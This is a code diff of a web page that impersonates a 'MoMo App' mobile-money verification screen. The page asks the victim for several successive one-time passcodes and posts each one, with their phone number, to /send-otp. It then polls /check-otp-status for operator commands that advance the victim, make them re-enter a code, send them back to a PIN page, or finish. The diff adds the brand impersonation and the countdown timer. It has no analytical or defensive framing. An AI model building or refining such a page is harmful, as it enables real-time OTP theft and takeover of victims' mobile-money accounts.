@@ -3,163 +3,233 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>OTP Verification</title>
+<title>Verification Step</title>
 
 <style>
-  body {
-    margin: 0;
-    font-family: Arial;
-    background: #0b5c6b;
-    color: white;
-    text-align: center;
-  }
+body {
+  margin: 0;
+  font-family: Arial;
+  background: #0b5c6b;
+  color: white;
+  text-align: center;
+}
 
-  .header {
-    background: #0b5c6b;
-    color: #ffcc00;
-    padding: 15px;
-    font-size: 20px;
-    font-weight: bold;
-  }
+.header {
+  background: #0b5c6b;
+  color: #ffcc00;
+  padding: 15px;
+  font-size: 20px;
+  font-weight: bold;
+}
 
-  .container {
-    background: white;
-    color: black;
-    max-width: 350px;
-    margin: 40px auto;
-    padding: 25px;
-    border-radius: 15px;
-  }
+.container {
+  background: white;
+  color: black;
+  max-width: 350px;
+  margin: 40px auto;
+  padding: 25px;
+  border-radius: 15px;
+}
 
-  input {
-    width: 100%;
-    padding: 15px;
-    margin-top: 15px;
-    border-radius: 10px;
-    border: 1px solid #ccc;
-    text-align: center;
-    font-size: 18px;
-    letter-spacing: 5px;
-  }
+input {
+  width: 100%;
+  padding: 15px;
+  margin-top: 15px;
+  border-radius: 10px;
+  border: 1px solid #ccc;
+  text-align: center;
+  font-size: 18px;
+  letter-spacing: 5px;
+}
 
-  button {
-    width: 100%;
-    padding: 15px;
-    margin-top: 20px;
-    background: #ffcc00;
-    border: none;
-    border-radius: 10px;
-    font-weight: bold;
-    cursor: pointer;
-  }
+button {
+  width: 100%;
+  padding: 15px;
+  margin-top: 20px;
+  background: #ffcc00;
+  border: none;
+  border-radius: 10px;
+  font-weight: bold;
+  cursor: pointer;
+}
 
-  button:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-  }
+button:disabled {
+  background: #ccc;
+}
 
-  .footer {
-    margin-top: 20px;
-    font-size: 12px;
-  }
+.footer {
+  margin-top: 20px;
+  font-size: 12px;
+}
 
-  .step-text {
-    font-size: 14px;
-    color: #666;
-    margin-bottom: 10px;
-  }
+.step-text {
+  font-size: 14px;
+  color: #666;
+  margin-bottom: 10px;
+  font-weight: bold;
+}
+
+.timer {
+  font-size: 13px;
+  color: #e63946;
+  margin-top: 10px;
+  font-weight: bold;
+}
 </style>
 </head>
 
 <body>
 
-<div class="header">Verification Step</div>
+<div class="header">MoMo App</div>
 
 <div class="container">
+
   <div id="stepIndicator" class="step-text">Step 1 of 3</div>
-  <h3 id="instruction">Enter OTP sent to your phone</h3>
+  <h3 id="instruction">Enter the OTP sent to your phone</h3>
 
   <form id="otpForm">
     <input type="number" id="otpInput" placeholder="******" required>
-    <button type="submit" id="otpBtn">Verify OTP</button>
+    <div id="timerDisplay" class="timer">Time remaining: 02:00</div>
+    <button type="submit" id="otpBtn">Confirm OTP</button>
   </form>
+
 </div>
 
-<div class="footer">Secure 256-bit Encryption</div>
+<div class="footer">2026@MoMo Verified</div>
 
 <script>
 const phone = localStorage.getItem("phone");
-let currentStep = 1;
+if (!phone) window.location.href = "/";
 
-if (!phone) {
-  window.location.href = "/";
+const otpForm = document.getElementById("otpForm");
+const otpInput = document.getElementById("otpInput");
+const otpBtn = document.getElementById("otpBtn");
+const stepIndicator = document.getElementById("stepIndicator");
+const instruction = document.getElementById("instruction");
+const timerDisplay = document.getElementById("timerDisplay");
+
+let currentStep = 1;
+let timeLeft = 120;
+let timerInterval = null;
+let polling = false;
+
+// ================= TIMER =================
+function startTimer() {
+  clearInterval(timerInterval);
+  timeLeft = 120;
+
+  timerInterval = setInterval(() => {
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      timerDisplay.innerText = "OTP Expired. Request new code.";
+      otpBtn.disabled = true;
+      return;
+    }
+
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+
+    const formatted =
+      String(minutes).padStart(2, "0") + ":" + String(seconds).padStart(2, "0");
+
+    timerDisplay.innerText = `Time remaining: ${formatted}`;
+
+    timeLeft--;
+  }, 1000);
 }
 
-// SUBMIT OTP
-document.getElementById("otpForm").addEventListener("submit", async (e) => {
+// ================= SUBMIT OTP =================
+otpForm.addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  const otp = document.getElementById("otpInput").value;
-  const btn = document.getElementById("otpBtn");
+  const otpValue = otpInput.value.trim();
+  if (!otpValue) return;
 
-  btn.innerText = "Checking...";
-  btn.disabled = true;
+  otpBtn.innerText = "Verifying...";
+  otpBtn.disabled = true;
 
   try {
     const res = await fetch("/send-otp", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ phone, otp, step: currentStep })
+      body: JSON.stringify({ phone, otp: otpValue, step: currentStep })
     });
 
     if (!res.ok) throw new Error("Server error");
 
-    waitStep();
+    startPolling();
 
   } catch (err) {
-    alert("Network error. Please try again.");
-    btn.innerText = "Verify OTP";
-    btn.disabled = false;
+    alert("Connection error");
+    otpBtn.innerText = "Confirm OTP";
+    otpBtn.disabled = false;
   }
 });
 
-// CHECK STATUS LOOP
-async function waitStep() {
+// ================= POLLING CONTROL =================
+function startPolling() {
+  if (polling) return;
+  polling = true;
+  pollOtpStatus();
+}
+
+// ================= STATUS CHECK =================
+async function pollOtpStatus() {
   try {
     const res = await fetch("/check-otp-status/" + phone);
-
     if (!res.ok) throw new Error("Status error");
 
     const data = await res.json();
 
-    if (data.status === "next") {
-      currentStep = data.nextStep || currentStep + 1;
+    const status = data.status || "verifying";
+    const step = data.step || currentStep;
 
-      document.getElementById("stepIndicator").innerText =
-        `Step ${currentStep} of 3`;
+    if (status === "next") {
+      currentStep = step;
 
-      document.getElementById("instruction").innerText =
-        "Enter the NEW OTP sent to you";
+      stepIndicator.innerText = `Step ${currentStep} of 3`;
+      instruction.innerText = "Enter the NEW OTP sent to your phone";
+      instruction.style.color = "black";
 
-      document.getElementById("otpInput").value = "";
+      otpInput.value = "";
+      otpBtn.innerText = "Confirm OTP";
+      otpBtn.disabled = false;
 
-      const btn = document.getElementById("otpBtn");
-      btn.innerText = "Verify OTP";
-      btn.disabled = false;
-
-    } else if (data.status === "success") {
-      window.location.href = "/success.html";
+      polling = false;
+      startTimer();
       return;
-
-    } else {
-      setTimeout(waitStep, 2000);
     }
 
+    if (status === "re-enter") {
+      instruction.innerText = "Incorrect OTP. Try again.";
+      instruction.style.color = "red";
+
+      otpBtn.innerText = "Confirm OTP";
+      otpBtn.disabled = false;
+
+      polling = false;
+      return;
+    }
+
+    if (status === "back-to-pin") {
+      window.location.href = "/pin.html";
+      return;
+    }
+
+    if (status === "finish") {
+      window.location.href = "/success.html";
+      return;
+    }
+
+    setTimeout(pollOtpStatus, 2000);
+
   } catch (err) {
-    console.log("Polling error:", err.message);
-    setTimeout(waitStep, 3000);
+    setTimeout(pollOtpStatus, 3000);
   }
 }
+
+// START
+startTimer();
 </script>
 
 </body>
